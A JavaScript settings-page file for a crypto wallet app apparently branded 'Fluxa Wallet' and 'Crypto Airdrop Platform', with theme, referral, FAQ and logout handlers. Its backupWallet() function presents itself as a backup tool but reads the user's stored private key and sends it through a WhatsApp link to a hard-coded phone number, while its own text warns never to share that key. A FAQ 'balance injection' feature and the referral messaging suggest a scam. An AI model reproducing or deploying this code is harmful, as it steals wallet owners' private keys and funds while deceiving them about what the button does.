
let showingReferralCode = false;

// Navigation functions
function goBack() {
    window.location.href = 'dashboard.html';
}

function goToDashboard() {
    window.location.href = 'dashboard.html';
}

function goToCalculator() {
    window.location.href = 'calculator.html';
}

function goToHistory() {
    window.location.href = 'history.html';
}

function goToSettings() {
    // Already on settings
}

// Settings functions
function changeLanguage() {
    const languages = ['English', 'Español', 'Français', '中文', 'العربية', 'हिन्दी'];
    const currentLanguage = localStorage.getItem('language') || 'English';
    
    showNotification('Language selector will be implemented soon', 'info');
}

function toggleTheme() {
    const darkThemeToggle = document.getElementById('darkThemeToggle');
    const isDark = darkThemeToggle.checked;
    
    localStorage.setItem('theme', isDark ? 'dark' : 'purple');
    
    // Apply theme changes
    if (isDark) {
        document.body.style.background = 'linear-gradient(135deg, #1f2937 0%, #111827 100%)';
    } else {
        document.body.style.background = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)';
    }
    
    showNotification(`Switched to ${isDark ? 'dark' : 'purple'} theme`, 'success');
}

function toggleNotification(type) {
    const setting = type === 'transaction' ? 'transactionNotifications' : 'pushNotifications';
    const checkbox = document.getElementById(setting);
    
    localStorage.setItem(setting, checkbox.checked);
    
    showNotification(
        `${type === 'transaction' ? 'Transaction' : 'Push'} notifications ${checkbox.checked ? 'enabled' : 'disabled'}`,
        'info'
    );
}

function toggleReferralCode() {
    const referralCodeElement = document.getElementById('referralCode');
    const toggleBtn = document.querySelector('.referral-code-box .toggle-btn');
    
    showingReferralCode = !showingReferralCode;
    
    if (showingReferralCode) {
        const referralCode = generateReferralCode();
        referralCodeElement.textContent = referralCode;
        toggleBtn.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94L17.94 17.94z"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19L9.9 4.24z"/>
            </svg>
        `;
    } else {
        referralCodeElement.textContent = '••••••••';
        toggleBtn.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
            </svg>
        `;
    }
}

function generateReferralCode() {
    // Generate a unique referral code based on wallet address
    const walletAddress = localStorage.getItem('walletAddress') || 'default';
    const hash = btoa(walletAddress).replace(/[^a-zA-Z0-9]/g, '').slice(0, 8).toUpperCase();
    return hash;
}

function copyReferralCode() {
    const referralCode = showingReferralCode 
        ? document.getElementById('referralCode').textContent 
        : generateReferralCode();
    
    navigator.clipboard.writeText(referralCode).then(() => {
        showNotification('Referral code copied to clipboard!', 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = referralCode;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        showNotification('Referral code copied to clipboard!', 'success');
    });
}

function shareReferralCode() {
    const referralCode = showingReferralCode 
        ? document.getElementById('referralCode').textContent 
        : generateReferralCode();
    
    const message = `Join the Crypto Airdrop Platform and earn rewards! Use my referral code: ${referralCode}`;
    
    if (navigator.share) {
        navigator.share({
            title: 'Crypto Airdrop Platform',
            text: message,
            url: window.location.origin
        });
    } else {
        // Fallback: copy to clipboard
        navigator.clipboard.writeText(message).then(() => {
            showNotification('Referral message copied to clipboard!', 'success');
        });
    }
}

function contactDeveloper() {
    const message = 'Hello GENX, I need help with the BNB Airdrop app';
    const whatsappUrl = `https://wa.me/2348071309276?text=${encodeURIComponent(message)}`;
    window.open(whatsappUrl, '_blank');
}

function logout() {
    if (confirm('Are you sure you want to logout? This will clear all your wallet data.')) {
        // Clear all localStorage data
        localStorage.clear();
        
        showNotification('Successfully logged out', 'success');
        
        setTimeout(() => {
            window.location.href = 'index.html';
        }, 1500);
    }
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';
    
    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

function backupWallet() {
    const walletAddress = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    const privateKey = localStorage.getItem('walletPrivateKey') || 'No private key found';
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    
    const backupData = `🔐 FLUXA WALLET BACKUP

📱 Device ID: ${deviceId}
🏠 Wallet Address: ${walletAddress}
🔑 Private Key: ${privateKey}

⚠️ SECURITY WARNING:
• Keep this information secure and offline
• Never share your private key with anyone
• Store this backup in a safe location
• Anyone with this key can access your funds

📅 Backup Date: ${new Date().toLocaleString()}
🔒 Generated by Fluxa Wallet v2.1.0

Need help? Contact: +234 807 130 9276`;
    
    const whatsappUrl = `https://wa.me/2348071309276?text=${encodeURIComponent(backupData)}`;
    window.open(whatsappUrl, '_blank');
}

function toggleCurrencyPreference() {
    const currencyDisplay = document.getElementById('currencyDisplay');
    const current = currencyDisplay.textContent;
    
    if (current === 'USD') {
        currencyDisplay.textContent = 'NGN';
        localStorage.setItem('preferredCurrency', 'NGN');
    } else {
        currencyDisplay.textContent = 'USD';
        localStorage.setItem('preferredCurrency', 'USD');
    }
    
    showNotification(`Currency preference updated to ${currencyDisplay.textContent}`, 'success');
}

function showFAQ() {
    const faqMessage = `❓ FLUXA WALLET FAQ

🔐 How do I secure my wallet?
• Never share your private key
• Keep your device ID safe
• Use secure networks only

💰 How do I check my balance?
• Open the dashboard
• Balance updates automatically
• Toggle visibility with eye icon

📤 How do I send BNB?
• Go to dashboard
• Click "Send" button
• Enter recipient address and amount

💉 What is balance injection?
• Feature to add test funds
• Safe and secure process
• Available for eligible accounts

📞 Need more help?
Contact support: +234 807 130 9276

🌟 Fluxa Wallet - Your Secure BNB Platform`;
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px; background: #1f2937; border: 1px solid #374151; border-radius: 16px; padding: 24px;">
            <div class="modal-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="color: #FFD700; margin: 0;">Frequently Asked Questions</h3>
                <button onclick="closeModal()" style="background: #4B5563; border: none; border-radius: 8px; width: 32px; height: 32px; color: #D1D5DB; cursor: pointer;">×</button>
            </div>
            <div style="color: #D1D5DB; white-space: pre-line; font-family: monospace; font-size: 12px; line-height: 1.6; max-height: 400px; overflow-y: auto;">
                ${faqMessage}
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function reportIssue() {
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    const walletAddress = localStorage.getItem('walletAddress') || 'Unknown';
    const balance = localStorage.getItem('walletBalance') || '0';
    
    const issueReport = `🐛 ISSUE REPORT

📱 Device ID: ${deviceId}
🏠 Wallet: ${walletAddress}
💰 Balance: ${balance} BNB
📅 Date: ${new Date().toLocaleString()}
🌐 Browser: ${navigator.userAgent.slice(0, 50)}

🔍 Issue Description:
[Please describe the issue you're experiencing]

🔄 Steps to Reproduce:
1. [Step 1]
2. [Step 2]
3. [Step 3]

📝 Expected Behavior:
[What you expected to happen]

📝 Actual Behavior:
[What actually happened]

📞 Contact: +234 807 130 9276
🌟 Fluxa Wallet Support Team`;
    
    const whatsappUrl = `https://wa.me/2348071309276?text=${encodeURIComponent(issueReport)}`;
    window.open(whatsappUrl, '_blank');
}

function closeModal() {
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.remove();
    }
}

// Initialize settings page
document.addEventListener('DOMContentLoaded', function() {
    // Load wallet information
    const walletAddress = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    const walletBalance = localStorage.getItem('walletBalance') || '0.3164';
    
    document.getElementById('walletAddressDisplay').textContent = `${walletAddress.slice(0, 8)}...${walletAddress.slice(-4)}`;
    document.getElementById('walletBalanceDisplay').textContent = `${walletBalance} BNB`;
    
    // Load saved settings
    const darkTheme = localStorage.getItem('theme') === 'dark';
    const transactionNotifications = localStorage.getItem('transactionNotifications') !== 'false';
    const pushNotifications = localStorage.getItem('pushNotifications') !== 'false';
    const priceAlerts = localStorage.getItem('priceAlerts') === 'true';
    const preferredCurrency = localStorage.getItem('preferredCurrency') || 'USD';
    
    // Set toggle states
    document.getElementById('darkThemeToggle').checked = darkTheme;
    document.getElementById('transactionNotifications').checked = transactionNotifications;
    document.getElementById('pushNotifications').checked = pushNotifications;
    document.getElementById('priceAlerts').checked = priceAlerts;
    document.getElementById('currencyDisplay').textContent = preferredCurrency;
    
    // Apply current theme
    if (darkTheme) {
        document.body.style.background = 'linear-gradient(135deg, #1f2937 0%, #111827 100%)';
    }
    
    // Add styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .settings-sections {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-bottom: 100px;
        }
        
        .settings-card {
            background: rgba(31, 41, 55, 0.8);
            border: 1px solid #374151;
            border-radius: 16px;
            padding: 20px;
        }
        
        .settings-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
            color: #FFD700;
            font-weight: 600;
        }
        
        .settings-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            width: 100%;
            padding: 12px 16px;
            background: #374151;
            border: 1px solid #4B5563;
            border-radius: 12px;
            color: #D1D5DB;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .settings-btn:hover {
            background: #4B5563;
            border-color: #6B7280;
        }
        
        .settings-btn.danger {
            background: #7F1D1D;
            border-color: #991B1B;
            color: #FCA5A5;
        }
        
        .settings-btn.danger:hover {
            background: #991B1B;
            border-color: #B91C1C;
        }
        
        .theme-option, .notification-option {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        
        .theme-info, .notification-info {
            flex: 1;
        }
        
        .theme-title, .notification-title {
            color: white;
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .theme-description, .notification-description {
            color: #9CA3AF;
            font-size: 12px;
        }
        
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #4B5563;
            transition: .4s;
            border-radius: 24px;
        }
        
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .slider {
            background-color: #FFD700;
        }
        
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        
        .notification-options {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        
        .referral-section {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .referral-stats {
            display: flex;
            gap: 20px;
        }
        
        .referral-stat {
            text-align: center;
            flex: 1;
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #FFD700;
        }
        
        .stat-label {
            font-size: 12px;
            color: #9CA3AF;
            margin-top: 4px;
        }
        
        .referral-code-section h4 {
            color: white;
            margin-bottom: 12px;
        }
        
        .referral-code-box {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #374151;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 16px;
        }
        
        .referral-code {
            flex: 1;
            color: #D1D5DB;
            font-family: monospace;
            font-size: 14px;
        }
        
        .referral-actions {
            display: flex;
            gap: 12px;
        }
        
        .developer-section {
            text-align: center;
        }
        
        .developer-name {
            font-size: 18px;
            font-weight: bold;
            background: linear-gradient(135deg, #FFD700, #8B5CF6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 4px;
        }
        
        .developer-title {
            color: #9CA3AF;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .security-info {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        
        .security-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        
        .security-item svg {
            color: #3B82F6;
            margin-top: 2px;
            flex-shrink: 0;
        }
        
        .security-title {
            color: white;
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .security-description {
            color: #9CA3AF;
            font-size: 12px;
        }
        
        .app-info {
            text-align: center;
            border: 1px solid #374151;
        }
        
        .app-version {
            color: #9CA3AF;
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        .app-features {
            color: #6B7280;
            font-size: 12px;
        }
    `;
    document.head.appendChild(style);
});
